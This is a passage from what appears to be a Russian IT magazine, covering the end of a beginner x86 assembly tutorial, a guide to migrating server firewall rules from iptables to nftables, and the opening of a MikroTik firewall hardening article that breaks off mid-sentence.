 и какие инс трумен ты для этого нужны? Сейчас расскажу
 и покажу — на при мере программы «Hello, world!». А попутно
 объясню, что про цессор твоего компьютера делает после
 того, как ты запус каешь программу.


 От редакции
 В 2017 году мы опубликова ли первую статью из планировавшегося цикла
  про ассемблер x86. Материал имел огромный успех, однако, к нашему стыду,
  так и остался единственным. Прошло два с полови ной года, и теперь за дело
  берется новый автор. В честь это го мы делаем прошлую статью бес платной,
  а Антона Карева попросили пропус тить введение и без оглядки нырять
  в практику.



 ГОТОВИМСЯ К РАБОТЕ
 Я буду исходить из того, что ты уже зна ком с программированием — знаешь
  какой‐нибудь из языков высокого уровня (С, PHP, Java, JavaScript и тому
 подобные), тебе доводи лось в них работать с шес тнадцатеричными числами,
 плюс ты умеешь поль зовать ся командной строкой под Windows,  Linux
  или macOS.


 Если наборы инструкций у процессоров разные, то на каком учить
 ассемблер лучше всего?
 Знаешь, что такое 8088? Это дедушка всех компьютерных процессоров! При‐
 чем живой дедушка. Я бы даже сказал — бес смертный и бессменный. Если
  с твоего процессора, будь то Ryzen, Core i9 или еще какой‐то, отколупать все
  примочки, налеп ленные туда под влиянием технологического прогресса, то
  останется старый доб рый 8088.
    SGX‐анклавы, MMX, 512‐битные SIMD‐регистры и другие новшества при‐
  ходят и уходят. Но дедушка 8088 остается неиз менным. Подружись сначала
  с ним. После этого ты легко разберешь ся с любой примочкой своего процес‐
  сора.
    Больше того, когда ты начинаешь с начала — то есть сперва выучи‐
 ваешь классический набор инструкций 8088 и толь ко потом постепенно зна‐
 комишься с современными фичами, — ты в какой‐то миг начинаешь видеть
  нестандартные способы применения этих самых фич. Смотри, например, что
  я сделал с SGX‐анклавами и SIMD‐регис тра ми.


 Что и как процессор делает после того, как ты запускаешь
 программу
 После того как ты запустил софтину и ОС загрузила ее в оперативную память,
  процессор нацеливается на первый байт твоей программы. Вычленяет оттуда
  инструкцию и выполняет ее, а выполнив, перехо дит к следующей. И так
 до конца программы.
    Некоторые инструкции занимают один байт памяти, другие два, три
  или больше. Они выглядят как‐то так:


  90
  B0 77
  B8 AA 77
  C7 06 66 55 AA 77

 Вернее, даже так:


  90 B0 77 B8 AA 77 C7 06 66 55 AA 77

  Хотя погоди! Только машина может понять такое. Поэтому много лет назад
  программисты придума ли более гуманный способ общения с компьютером:
  создали ассемблер.
    Благодаря ассемблеру ты теперь вмес то того, чтобы танцевать с бубном
  вокруг шестнадцатеричных чисел, можешь те же самые инструкции писать
  в мнемонике:


  nop
  mov al, 0x77
  mov ax, 0x77AA
  mov word [0x5566], 0x77AA

 Согласись, такое читать куда легче. Хотя, с другой стороны, если ты видишь
 ассемблерный код впервые, такая мнемоника для тебя, скорее всего, тоже
  непонятна. Но мы сейчас это испра вим.


 Регистры процессора: зачем они нужны, как ими пользоваться
  Что делает инструкция mov? Присваивает чис ло, которое указано справа,
 переменной, которая ука зана слева.
    Переменная — это либо один из регистров процес сора, либо ячейка
  в оперативной памяти. С регистрами процессор работает быс трее, чем
  с памятью, потому что регистры расположены у него внутри. Но регистров
  у процессора мало, так что в любом случае что‐то приходится хранить
  в памяти.
    Когда программируешь на ассемблере, ты сам решаешь, какие перемен‐
 ные хранить в памяти, а какие в регистрах. В языках высокого уровня эту
  задачу выполняет компилятор.
    У процессора 8088 регистры 16‐битные, их восемь штук (в скобках ука‐
  заны типичные способы применения регистра):
  • AX — обще го назначения (аккумулятор);
  • BX — обще го назначения (адрес);
  • CX — обще го назначения (счетчик);
  • DX — обще го назначения (рас ширяет AX до 32 бит);
  • SI — обще го назначения (адрес источника);
  • DI — обще го назначения (адрес приемника);
  • BP — указатель базы (обычно адресует переменные, хранимые на стеке);
  • SP — указатель стека.

 Несмотря на то что у каждого регистра есть типичный способ примене ния, ты
 можешь использовать их как заблагорас судится. Четыре первых регис тра —
  AX, BX, CX и DX — при желании можно использовать не пол ностью, а половин‐
  ками по 8 бит (старшая H и младшая L): AH, BH, CH, DH и AL, BL, CL, DL. Нап‐
  ример, если запишешь в AX число 0x77AA (mov ax, 0x77AA), то в AH попадет
  0x77, в AL — 0xAA.
   С теорией пока закончили. Давай теперь подготовим рабочее место
  и напишем программу «Hello, world!», чтобы понять, как эта теория работает
 вживую.


 Готовим рабочее место
   1. Скачай компилятор NASM с www.nasm.us. Обра ти внимание, он работает
    на всех современных ОС: Windows 10, Linux, macOS. Распакуй NASM
    в какую‐нибудь папку. Чем ближе папка к корню, тем удобней. У меня
     это c:\nasm (я работаю в Windows). Если у тебя Linux или macOS, можешь
    создать папку nasm в своей домашней директории.
   2. Тебе надо как‐то редактировать исходный код. Ты можешь пользоваться
    любым  текстовым редактором, который тебе по душе: Emacs,  Vim,
    Notepad, Notepad++ — сойдет любой. Лично мне нравится редактор,
    встроенный в Far Manager, с плагином Colorer.
   3. Чтобы в современных ОС запускать программы, написанные для 8088,
    и проверять, как они работают, тебе понадобится DOSBox или VirtualBox.


 ПИШЕМ, КОМПИЛИРУЕМ И ЗАПУСКАЕМ ПРОГРАММУ «HELLO,
 WORLD!»
 Сейчас ты напишешь свою первую программу на ассемблере. Назови ее
  как хочешь (например, first.asm) и скопируй в папку, где установлен nasm.





  Если тебе непонятно, что тут написа но, — не переживай. Пока просто пос‐
  тарайся привыкнуть к ассемблерному коду, пощупать его пальцами. Чуть
 ниже я все объясню. Плюс студенческая мудрость гласит: «Тебе что‐то
  непонятно? Перечитай и перепиши несколько раз. Сначала непонятное ста‐
  нет привычным, а затем привычное — понят ным».
    Теперь запусти командную строку, в Windows это cmd.exe. Потом зай ди
  в папку nasm и скомпилируй программу, используя вот такую команду:


  nasm ‐f bin first.asm ‐o first.com

  Если  ты  все сделал правильно,  программа должна скомпилироваться
  без ошибок и в командной стро ке не появится никаких сообщений. NASM
  просто создаст файл first.com и завершится.
    Чтобы запустить этот файл в современной ОС, открой DOSBox и введи
  туда вот такие три команды:


  mount c c:\n asm
  c:
  first

 Само собой, вместо c:\nasm тебе надо написать ту папку, куда ты скопиро‐
  вал компилятор. Если ты все сделал правиль но, в консоли появится сооб‐
 щение «Hello, world!».





 Инструкции, директивы
 В нашей с тобой программе есть только три вещи: инструкции, директивы
  и метки.
   Инструк ции. С инструкциями ты уже зна ком (мы их разбирали чуть выше)
  и знаешь, что они представляют собой мнемонику, которую компилятор
  переводит в машин ный код.
   Дирек тивы (в нашей прог рамме их две: org и db) — это рас поряжения,
  которые ты даешь компилятору. Каждая отдель но взятая директива говорит
 компилятору, что на эта пе ассемблирова ния нужно сделать такое‐то дей‐
  ствие. В машинный код директива не переводится, но она влияет на то, каким
 образом будет сгенерирован машин ный код.
    Директива org говорит компилятору, что все инструкции, которые пос‐
  ледуют дальше, надо помещать не в начале сегмента кода, а отступив
  от начала столько‐то байтов (в нашем случае 0x0100).
    Директива db сооб щает компилятору, что в коде нужно поместить цепочку
  байтов. Здесь мы перечисляем через запятую, что туда вставить. Это может
  быть либо строка (в кавычках), либо сим вол (в апос трофах), либо прос то чис‐
  ло.
   В нашем случае: db "Hello, world", '!', 0.
   Обрати внимание, символ вос клицательного знака я отре зал от остальной
  строки только для того, что бы показать, что в директиве db можно опериро‐
  вать отдельными символами. А вообще писать лучше так:


  db "Hello, world!", 0


 Метки, условные и безусловные переходы
 Метки используются для двух целей: задавать имена переменных, которые
  хранятся в памяти (такая метка в нашей программе только одна: string),
  и помечать участки в коде, куда можно прыгать из других мест программы
  (таких меток в нашей прог рамме три шту ки — те, которые начинаются с двух
 символов собаки).
    Что значит «прыгать из дру гих мест программы»? В норме процессор
  выпол няет инструкции последова тельно, одну за дру гой. Но если тебе надо
  организовать ветвле ние (усло вие или цикл), ты можешь задействовать инс‐
  трукцию перехода. Прыгать можно как вперед от текущей инс трукции, так
  и назад.
    У тебя в распоряжении есть одна инструкция безус ловного перехода (jmp)
  и штук двадцать инструкций условного перехо да.
   В нашей программе задействованы две инструкции перехода: je и jmp.
 Первая выполняет условный переход (Jump if Equal — прыгнуть, если равно),
  вторая (Jump) — безусловный. С их помощью мы орга низовали цикл.
   Обрати внимание: метки начинаются либо с буквы, либо со знака под‐
  черкивания, либо со знака собаки. Цифры вставлять тоже можно, но только
  не в начало. В конце мет ки обязательно ста вится двоеточие.


 Комментарии, алгоритм, выбор регистров
  Итак, в нашей программе есть только три вещи: инс трукции, директивы и мет‐
  ки. Но там могла бы быть и еще одна важная вещь: комментарии. С ними
  читать исходный код намного проще.
    Как добав лять комментарии? Просто поставь точку с запятой, и все, что
 напишешь после нее (до конца стро ки), будет комментарием. Давай добавим
 комментарии в нашу программу.





  Теперь, когда ты разобрался во всех час тях программы по отдельности, поп‐
  робуй вникнуть, как все части служат алгоритму, по которому работает наша
  программа.
   1. Поместить в BX адрес строки.
   2. Поместить в AL очередную букву из стро ки.
   3. Если вместо буквы там 0, выходим из программы — переходим на 6‐й шаг.
   4. Выводим букву на экран.
   5. Повторяем со вто рого шага.
   6. Конец.

 Обрати внимание, мы не можем использовать AX для хранения адреса,
  потому что нет таких инструкций, которые бы считыва ли память, используя AX
  в качестве регистра‐источника.


 ПОЛУЧАЕМ ДАННЫЕ С КЛАВИАТУРЫ
 От программ, которые не могут взаимодей ство вать с пользователем, толку
  мало. Так что смотри, как можно считывать данные с клавиату ры. Сохрани вот
  этот код как second.asm.





 Потом иди в командную строку и скомпилируй его в NASM:


  nasm ‐f bin second.asm ‐o second.com

 Затем запусти скомпилированную прог рамму в DOSBox:


  second

  Как работает программа? Две строки пос ле мет ки @@start вызывают фун‐
 кцию BIOS, которая считывает символы с клавиату ры. Она ждет, когда поль‐
  зователь нажмет какую‐нибудь клавишу, и затем кладет ASCII‐код получен‐
  ного значения в регистр AL. Например, если наж мешь заглавную A, в AL
  попадет 0x41, а если строчную a — 0x61.
    Дальше смотрим: если нажата клавиша с кодом 0x1B (клавиша ESC), то
 выходим из программы. Если же нажата не ESC, вызываем ту же функцию, что
  и в предыдущей программе, что бы показать символ на экране. После того
  как покажем — прыгаем в начало (jmp): start.
   Обрати вни мание, инструкция cmp (от слова compare — сравнить) выпол‐
  няет сравнение, инструкция je (Jump if Equal) — пры жок в конец программы.


 ПОЛЕЗНЫЕ МЕЛОЧИ: СМОТРИМ МАШИННЫЙ КОД,
 АВТОМАТИЗИРУЕМ КОМПИЛЯЦИЮ
  Если тебе интересно, в какой машинный код преобра зуются инструкции прог‐
 раммы, скомпилируй исходник вот таким вот обра зом (добавь опцию ‐l):


  nasm ‐f bin second.asm ‐l second.lst ‐o second.com

  Тогда NASM создаст не только исполня емый файл, но еще и листинг: second.
  lst. Листинг будет выглядеть как‐то так.





 Еще тебе наверняка уже надоело при каж дом компилировании вколачивать
  в командную строку длин ную последовательность одних и тех же букв. Если
  ты используешь Windows, можешь создать батник (например, m.bat) и вста‐
  вить в него вот такой текст.





  Теперь ты можешь компилировать свою прог рамму вот так:


  m first

 Само собой, вместо first ты можешь подставить любое имя фай ла.


 ВЫВОДЫ
  Итак, ты теперь знаешь, как написать простейшую программу на ассембле ре,
  как ее скомпилировать, какие инструменты для этого нужны. Конечно, про‐
  читав одну статью, ты не станешь опытным программистом на ассемблере.
  Чтобы придумать и написать на нем что‐то стоящее — вроде Floppy Bird
  и «МикроБ», которые написал  я, — тебе предсто ит еще много прой ти.
 Но первый шаг в эту сторону ты уже сделал.
АДМИН
   NFTABLES

        КАК ВЫГЛЯДИТ БУДУЩЕЕ
     НАСТРОЙКИ ФАЙРВОЛА В LINUX





Начинающие админы часто считают, что
файрвол в Linux называ ется iptables. Более
опытные знают, что нынешняя подсистема
ядра для фильтрации трафика и модифи‐
кации   пакетов   называ ется    NetFilter,         Даниил Батурин                                                                                   Координатор проекта VyOS
а команда  iptables  всего лишь  утилита        (https://vyos.io),функциональщик,«языковед»,иногда
для ее нас тройки. В этой статье я поз‐         сетевойdaniil@baturin.orgадминистратор
накомлю  тебя  с  новым  инструмен том,
который все чаще встречается в современ‐
ных дистрибутивах, — nftables.


             INFO

                     Возможно, для тебя это будет новостью, но ipta‐
                          bles вовсе не уникальна, есть и другие утилиты
                      подобного  рода. Собственно,  настраивать ей
                   можно    только    правила    для    пакетов
                          IPv4 на сетевом уровне. Для IPv6 понадобится
                   ip6tables, для канального уровня — ebtables
                      и arptables.


Настройка сетевых интерфейсов, маршру тов, прос транств имен и прочего
уже давно унифицирована в утилите ip из пакета iproute2, а зоопарк старых
утилит (ifconﬁg, vconﬁg, route и прочие) поддержи вается только для совмести‐
мости со старыми скриптами. Ждет ли такая же унификация межсетевой
экран? До версий ядра 2.4 Linux прошел через множество реализаций меж‐
сетевых экранов в ядре и утилит для их настройки (ipﬁlter, ipfwadm, ipchains),
но NetFilter и iptables используются уже почти двадцать лет и кажутся незыб‐
лемыми.
   Как ни странно, первые попытки переосмыслить настрой ку МСЭ предпри‐
нимались еще в 2008 году. Про ект назвали nftables, но он стал легендарным
(в узких кругах) дол гостроем. В 2014 году его наконец приняли в основную
ветку ядра 3.13, но пользовательские ути литы какое‐то время оставались
почти непригодными к работе. К примеру, счетчики пакетов для правил хра‐
нились в ядре, но просмотреть их из пространс тва пользователя не было
никакой возможности.
  Сейчас дело наконец меняется и дистрибутивы даже начинают исполь‐
зовать nftables по умол чанию. Сто ронние инс трументы вроде fail2ban тоже
уже добавляют ее поддержку.
  Несколько причин расстать ся с iptables и перейти на nftables:
 • унифицированный синтаксис;
 • быстрая загрузка больших конфигов;
 • встроенная поддержка списков адресов/портов;
 • средства автоматичес кой конвертации правил из iptables;
 • вывод правил в JSON.

В этой статье мы перенесем нас тройки моего VPS с iptables на nftables.
Использовать сразу оба инс тру мента на одной машине не выйдет, так что
нужно планировать одномоментную миграцию.
  Документацию можно найти в вики проекта.


ПРОБЛЕМЫ IPTABLES
Хотя NetFilter впол не хорошо справлялся со своей задачей, его настройка
через iptables нередко ока зывалась куда сложнее, чем могла бы быть.
  К примеру, встроенный син таксис для групп адресов и сетей в нем так и не
появился. Существует отдельный инс трумент для этих целей — ipset, который
позволяет создать группы и ссылаться на них в правилах, вроде iptables ‐I
FORWARD ‐m set ‐‐match‐set TrustedHosts src ‐j ACCEPT.
  Однако само то, что группы настра иваются отдельно от правил и с
помощью другой утилиты, соз дает много проб лем. Нужно помнить два разных
синтаксиса, да еще и убедиться, что настройки ipset при загрузке применя‐
ются раньше правил iptables, — это при том, что во многих дистрибутивах Lin‐
ux встроенного сервиса для ipset так и нет.
  Другая надоедливая проблема — нельзя указать несколько раз ных дей‐
ствий в одном правиле.
   Хотя еще больше раз дра жает отсутствие воз можности использовать одни
правила для IPv4 и IPv6. В современном мире dual stack уже стал нормой
на серверах, машин с одним IPv4 все мень ше, а машин с одним IPv6 нет и не
предвидится, в итоге админу приходится дуб лировать одни и те же правила
в двух разных конфигах.
  Кроме того, в некото рых местах синтаксис опций iptables дос таточно хруп‐
кий. Где‐то можно ставить пробел пос ле запятой, где‐то нет. Где‐то можно
смело поменять две опции местами, где‐то это вызовет ошибку. Если пра‐
вила генерируются скриптом, это особен но усложняет тестирование.
  Все это приводит к тому, что iptables часто используют как своеобразный
низкоуровневый «язык ассемблера», который генерируется либо фронтенда‐
ми вроде shorewall или ﬁrewalld, либо пользователь скими скриптами. А цель
проекта nftables — в пер вую очередь сделать настройку правил простой
и удобной для человека. Давай посмотрим, насколько это удалось.


АВТОМАТИЧЕСКАЯ ТРАНСЛЯЦИЯ
Авторы nftables определен но учли горький опыт многих других больших миг‐
раций и написали инструменты для авто матической трансляции правил из ipt‐
ables. Можно конвертировать как отдель ные команды, так и файлы для ipta‐
bles‐restore.
  К сожалению, возможнос ти автоматичес кой трансля ции нас троек ipset там
нет, в первую очередь из‐за совершенно разных подходов к нас тройке групп,
ну и из‐за малой популярности ipset.
  Отдельные правила транслируются с помощью утилиты iptables‐trans‐
late, а наборы правил из iptables‐save — с помощью iptables‐restore‐
translate. Это только для IPv4, для правил ip6tables нужно использовать
ip6tables‐restore‐translate и далее по ана логии.


             INFO

                   В Debian эти утилиты находят ся в пакете iptables,
                        в Fedora — в пакете iptables‐nft.


Посмотрим  на  трансляцию  отдельных  пра вил.  Команда  iptables‐
translate — самый простой способ изучить новый синтаксис на примерах
(хотя и не заменит чтения документации!).


$ iptables‐translate ‐t nat ‐I POSTROUTING ‐s 10.0.0.0/24 ‐o eth0 ‐j
MASQUERADE
nft insert rule ip nat POSTROUTING oifname "eth0" ip saddr
10.0.0.0/24 counter masquerade


$ iptables‐translate ‐A INPUT ‐m state ‐‐state NEW ‐m tcp ‐p tcp
‐‐dport 53   ‐j ACCEPT ‐m comment ‐‐comment "DNS zone transfer"
nft add rule ip filter INPUT ct state new  tcp dport 53 counter ac‐
cept comment "DNS zone transfer"

Как видим, стиль син таксиса больше похож на pf и дру гие МСЭ из систем
семейства BSD.
   Но! Воспользоваться этими командами на непод готовленной системе
не выйдет, и вот почему: в nftables больше нет предопределенных таблиц
и цепочек.


Хуки вместо цепочек
В iptables цепочки INPUT или FORWARD находят ся в таблице filter по умол‐
чанию, так же как PREROUTING и POSTROUTING в таблице nat. В nftables
не существует никаких таблиц и цепочек по умолчанию. Особое значение там
есть у типов таблиц и хуков, а имена таблиц и цепочек могут быть совершенно
произвольными.
  В целом имена хуков повторя ют старые имена специальных цепочек, но в
нижнем регистре. Например, input, output, forward. Скоро мы увидим их в дей‐
ствии.


ПЕРЕНОСИМ ПРАВИЛА
Для экономии времени мы не будем писать правила с нуля, а воспользуемся
iptables‐restore‐translate и творчески переработаем ее вывод.
  На моем VPS стоит Fedora, поэто му все команды и расположе ние кон‐
фигов я даю имен но для это го дистрибути ва. Из сервисов: SSH, веб, почта,
DNS — типичный набор.
  Для начала вык лючим и оста новим ста рые сервисы iptables.


$ sudo systemctl disable iptables
$ sudo systemctl stop iptables
$ sudo systemctl disable ip6tables
$ sudo systemctl stop ip6tables

Теперь посмотрим на пра вила (cat /etc/sysconfig/iptables).


*filter
:INPUT ACCEPT [0 :0 ]
:FORWARD ACCEPT [0 :0 ]
:OUTPUT ACCEPT [0 :0 ]


# Keep state
‐A INPUT ‐m state ‐‐state ESTABLISHED ,RELATED ‐j ACCEPT


# SSH
‐A INPUT ‐m state ‐‐state NEW ‐m tcp ‐p tcp ‐‐dport 22 ‐j ACCEPT ‐m
comment ‐‐comment "SSH"


# Email
‐A INPUT ‐m state ‐‐state NEW ‐m tcp ‐p tcp ‐‐dport 25   ‐j ACCEPT ‐m
comment ‐‐comment "SMTP"
‐A INPUT ‐m state ‐‐state NEW ‐m tcp ‐p tcp ‐‐dport 465  ‐j ACCEPT ‐m
comment ‐‐comment "SMTPS (SSL/TLS)"
‐A INPUT ‐m state ‐‐state NEW ‐m tcp ‐p tcp ‐‐dport 587  ‐j ACCEPT ‐m
comment ‐‐comment "SMTP StartTLS"
‐A INPUT ‐m state ‐‐state NEW ‐m tcp ‐p tcp ‐‐dport 993  ‐j ACCEPT ‐m
comment ‐‐comment "IMAPS"
‐A INPUT ‐m state ‐‐state NEW ‐m tcp ‐p tcp ‐‐dport 995  ‐j ACCEPT ‐m
comment ‐‐comment "POP3S"


# DNS
‐A INPUT ‐m state ‐‐state NEW ‐m tcp ‐p tcp ‐‐dport 53   ‐j ACCEPT ‐m
comment ‐‐comment "DNS zone transfer"
‐A INPUT ‐p udp ‐‐dport 53   ‐j ACCEPT ‐m comment ‐‐comment "DNS
queries"


# HTTP
‐A INPUT ‐m state ‐‐state NEW ‐m tcp ‐p tcp ‐‐dport 80   ‐j ACCEPT ‐m
comment ‐‐comment "HTTP"
‐A INPUT ‐m state ‐‐state NEW ‐m tcp ‐p tcp ‐‐dport 443  ‐j ACCEPT ‐m
comment ‐‐comment "HTTPS"


# ICMP
‐A INPUT ‐p icmp ‐j ACCEPT


# Local traffic
‐A INPUT ‐i lo ‐j ACCEPT


# Default actions
‐A INPUT ‐j REJECT ‐‐reject ‐with icmp ‐host ‐prohibited
‐A FORWARD ‐j REJECT ‐‐reject ‐with icmp ‐host ‐prohibited
COMMIT

Кроме них, есть /etc/sysconfig/ip6tables, который отличается тремя пра‐
вилами.


# ICMP
‐A INPUT ‐p ipv6 ‐icmp ‐j ACCEPT


# Default actions
‐A INPUT ‐j REJECT ‐‐reject ‐with icmp6 ‐adm ‐prohibited
‐A FORWARD ‐j REJECT ‐‐reject ‐with icmp6 ‐adm ‐prohibited

Теперь конвертируем этот конфиг в синтаксис nftables. Пиши:


$ sudo iptables‐restore‐translate ‐f /etc/sysconfig/iptables

Результат будет сле дующим.


add table ip filter
add chain ip filter INPUT { type filter hook input priority 0 ; policy
accept ; }
add chain ip filter FORWARD { type filter hook forward priority 0 ;
policy accept ; }
add chain ip filter OUTPUT { type filter hook output priority 0 ;
policy accept ; }
add rule ip filter INPUT ct state related,established  counter accept
add rule ip filter INPUT ct state new  tcp dport 22 counter accept
comment "SSH"
add rule ip filter INPUT ct state new  tcp dport 25 counter accept
comment "SMTP"
add rule ip filter INPUT ct state new  tcp dport 465 counter accept
comment "SMTPS (SSL/TLS)"
add rule ip filter INPUT ct state new  tcp dport 587 counter accept
comment "SMTP StartTLS"
add rule ip filter INPUT ct state new  tcp dport 993 counter accept
comment "IMAPS"
add rule ip filter INPUT ct state new  tcp dport 995 counter accept
comment "POP3S"
add rule ip filter INPUT ct state new  tcp dport 53 counter accept
comment "DNS zone transfer"
add rule ip filter INPUT udp dport 53 counter accept comment "DNS
queries"
add rule ip filter INPUT ct state new  tcp dport 80 counter accept
comment "HTTP"
add rule ip filter INPUT ct state new  tcp dport 443 counter accept
comment "HTTPS"
add rule ip filter INPUT ip protocol icmp counter accept
add rule ip filter INPUT iifname "lo" counter accept
add rule ip filter INPUT counter reject with icmp type host ‐
prohibited
add rule ip filter FORWARD counter reject with icmp type host ‐
prohibited

Ключевое слово ct — это, конечно же, ConnTrack — механизм отслеживания
состояния соединений в ядре Linux. Опция counter отсутс твовала в исходных
правилах iptables. Просто nftables не включает счетчики правил по умол чанию,
и, если они тебе важны, нужно включить их этой опци ей.
  Существенный недостаток синтаксиса в сти ле pf — он имеет свойство
превращаться в пло хо читаемую стену тек ста. К счастью, такой синтаксис
обязателен только для команды nft. Для скриптов, которые загружаются
с помощью nft  ‐f,  nftables поддержи вает более читаемый синтаксис
с фигурными скобками и воз можностью писать несколько опций в одной
строке через точку с запятой.
  Самый простой способ конвертировать этот синтаксис в вариант со скоб‐
ками — сохранить эти пра вила в файл (например, /tmp/rules.nft), при‐
менить их с помощью nft ‐f /tmp/rules.nft и прос мотреть их командой
nft list ruleset.
  Команда nft list ruleset может заменить и iptables ‐L ‐nv, и ipta‐
bles‐save. Кро ме того, она поддерживает вывод правил в JSON вмес те
со значениями счетчиков с помощью опции ‐j/‐‐json — мечта авторов
фронтендов для настройки.
  Можно было бы прос то сохранить конвертированные правила в один
из файлов в /etc/nftables/ и огра ничиться этим, но можно и немного реор‐
ганизовать конфиг с помощью новых фич nftables.


Куда поместить новые конфиги
В iptables не существует способов разделить конфиг на части, из‐за чего
многие люди и генерируют конфиги скриптами. Другое дело nftables — там
есть опция include.
  В Fedora есть файл /etc/sysconfig/nftables.conf, который читает
скрипт сервиса nftables. Этот файл состоит из одних опций include, а в
/etc/nftables/ лежит набор загото вок конфигов. Мы поместим наши новые
правила в файл inet‐filter.nft.
  Перед этим нужно раскомментировать в файле /etc/sysconfig/nfta‐
bles.conf строку include "/etc/nftables/inet‐filter.nft".
  В файле из поставки дистрибутива для нас определена таблица inet
filter с цепочками, которые повторяют смысл таб лицы filter в iptables
по умолчанию.



/etc/nftables/inet-filter.nft

#!/usr/sbin/nft ‐f


table inet filter {
  chain input    { type filter hook input priority 0; }
  chain forward  { type filter hook forward priority 0; }
  chain output   { type filter hook output priority 0; }
}

Здесь ﬁlter — произволь ное наз вание таб лицы, а ключевое слово inet — ее
тип.   Если   типы   ip   и   ip6   огра ничивают   таблицу   правилами
для IPv4 и IPv6 соот ветственно, то тип inet поз воляет писать правила
для обоих протоколов. Если все сервисы дос тупны по обоим протоколам,
таким способом можно избежать дублирования правил почти полностью.
   Названия chain  input и прочие тоже чис то информационные, наз‐
начение цепочки определяет опция type, вроде type filter hook input.
Соответственно, если бы у нас был NAT, нам нужна была бы таблица с опцией
type nat hook prerouting вместо пра вил вида iptables ‐t nat ‐I PRE‐
ROUTING и так далее по аналогии.


Добавляем правила
Поскольку нас интересует филь тра ция вхо дящего тра фика, свои правила мы
будем дописывать внутрь chain input. По сути, копируем из вывода ipta‐
bles‐restore‐translate все пос ле add rule ip filter INPUT и встав‐
ляем внутрь chain input.
  В своих старых настройках я использовал по одному правилу на каждый
порт TCP или UDP. В iptables есть опция ‐‐dports, но в nftables все еще про‐
ще: можно писать порты в фигурных скобках через запятую. Этим мы и вос‐
пользуемся и объединим все пра вила для каж дого сервиса в одно, например
dport {80, 443} для HTTP(S).
  Получится что‐то вроде такого:


table inet filter {
  chain input {
    type filter hook input priority 0


    ct state related,established accept


    # Services
    ct state new tcp dport ssh counter accept


    ct state new tcp dport { 25, 465, 587} counter accept comment SMTP
    ct state new tcp dport { 993, 995} counter accept comment "IMAPS
and POP3S"


    ct state new tcp dport { 80, 443} counter accept comment "HTTP"


    udp dport 53 counter accept comment "DNS queries"


    ct state new tcp dport 53 counter accept comment "DNS zone
transfers"


    # ICMP
    ip protocol icmp accept
    meta l4proto ipv6‐icmp accept


    # Loopback
    iifname lo accept


    # Reject everything else
    meta nfproto ipv4 reject with icmp type admin‐prohibited
    meta nfproto ipv6 reject with icmpv6 type admin‐prohibited
  }


  chain forward {
    type filter hook forward priority filter; policy accept;
    meta nfproto ipv4 reject with icmp type admin‐prohibited
    meta nfproto ipv6 reject with icmpv6 type admin‐prohibited
  }


  chain output { type filter hook output priority 0; }
}

Теперь осталось запустить сервис nftables и пос тавить его на загрузку:


$ sudo systemctl start nftables
$ sudo systemctl enable nftables

Если работаешь на удаленной машине без доступа к консоли, не забудь зап‐
ланировать перезагрузку (shutdown ‐r +10) или сброс правил (echo "nft
flush ruleset | at now+10min").


Создаем группы адресов
Правило про tcp dport 53 раз реша ет репликацию зон DNS на вторичные
серверы. Если обычные запросы DNS выполняются через UDP, то репликация
зон — через TCP.
  Конечно, репликация дос тупна не всем подряд, а вполне определенным
хостам,  в  моем  случае  это  вторичные  серверы  Hurricane   Electric:
216.218.133.2 и 2001:470:600::2. До миграции это ограничение было про‐
писано в настройках самого BIND, но мы добавим его и в правила nftables,
чтобы посмотреть на синтаксис переменных и групп.
  Переменные определяются с помощью ключевого слова define, нап‐
ример define foo =  192.0.2.1. На них можно ссы латься в стиле shell
с помощью $foo. Объявления переменных мы поместим в самое начало фай‐
ла.
  Затем мы создадим две группы, одну для IPv4, другую для IPv6. Увы,
использовать оба типа адресов в одной группе не выйдет, но зато проверка
нахождения адреса в группе в nftables выполняется за время O(1).
   Группы определяются с помощью ключевого слова set, и в них нужно ука‐
зать тип. Когда они определены, в опци ях пра вил на них можно ссы латься
с помощью @setname.
  С переменными и группами наш конфиг примет следующий вид:


#!/usr/sbin/nft ‐f


define he_dns_ipv4 = 216.218.133.2
define he_dns_ipv6 = 2001:470:600::2


table inet filter {
  set secondary_dns_ipv4 {
    type ipv4_addr;
    elements = { $he_dns_ipv4 }
  }


  set secondary_dns_ipv6 {
    type ipv6_addr;
    elements = { $he_dns_ipv6 }
  }


  chain input {
    ...
    udp dport 53 counter accept comment "DNS queries"


    ct state new tcp dport 53 ip saddr @secondary_dns_ipv4 counter
accept comment "DNS zone transfers"
    ct state new tcp dport 53 ip6 saddr @secondary_dns_ipv6 counter
accept comment "DNS zone transfers"
  ...


ЗАКЛЮЧЕНИЕ
На мой взгляд, син таксис nftables и ее подход к работе с конфигами —
это значительный прогресс по сравнению с iptables и рас ставаться со ста‐
рыми инструментами можно без сожаления.
АДМИН
 СТЕНА
 ОГНЯ


             НАСТРАИВАЕМ ФАЙРВОЛ
               ДЛЯ ОТРАЖЕНИЯ АТАК    LVL2
                НА ПРИМЕРЕ MIKROTIK





                                                                     Дмитрий Бубнов
                                                                                 Тренер MikroTik. Автор
                                                                                            канала
                                                                                                     https://t.me/mikrotikninja
                                                                                      dv@bubnovd.net




В этой статье мы рассмотрим, как защищать роутер MikroTik
от атак и сканеров портов, а также предотвратим попадание
нашей сети в бан‐листы. Полученный опыт поможет тебе
настраивать и другие виды файрво лов.


             INFO

                   Общие прин ципы безопасной настройки роуте ра
                      и принципы оптимальной настройки файрвола ты
                    можешь узнать в предыдущих статьях.



УНИФИКАЦИЯ НАСТРОЕК
Если у тебя большая сеть с нес колькими филиала ми и в каждом из них по два
роутера для отказоустойчивос ти, то правила лучше настроить так, чтобы их
можно было легко развернуть на любой желез ке, независимо от количества
и именования портов или типа подклю чения. Для соединения по PPPoE, нап‐
ример, WAN‐интерфей сом будет pppoe‐out1, а для DHCP — ether1. Если
попытаться экспортировать конфиг файрво ла с одного роутера на другой,
ничего не выйдет, потому что у вто рого просто нет интерфейса pppoe‐out1.
Или представь себе, что в одном филиале локальная сеть висит на ether9,
а в другом стоит роутер с пятью портами, из‐за чего конфигурация девятого
порта просто не встанет и вылетит с ошиб кой.
  Поэтому мы будем настра ивать роутер так, чтобы конфиг можно было
без проблем перенести на любой дру гой роутер. Это немного усложнит пер‐
воначальную настрой ку, но сэкономит кучу времени в будущем.
  Мы уже рассматривали списки интерфей сов. Это фича для оперирования
несколькими интерфейсами как одним. Создадим листы WAN и LAN, а затем
добавим туда нужные интерфейсы. Теперь пра вила файрвола будем при‐
вязывать к интерфейс‐листам, а не к отдельным интерфейсам. Перед экспор‐
том правил на другой роутер просто соз дадим на нем нужные листы, и конфиг
встанет без ошибок.





                                   Interface List

Обрати внимание, что для использования в файрволе нам нужны L3‐
интерфейсы, то есть те, на которых есть IP‐адреса. Если ты получаешь
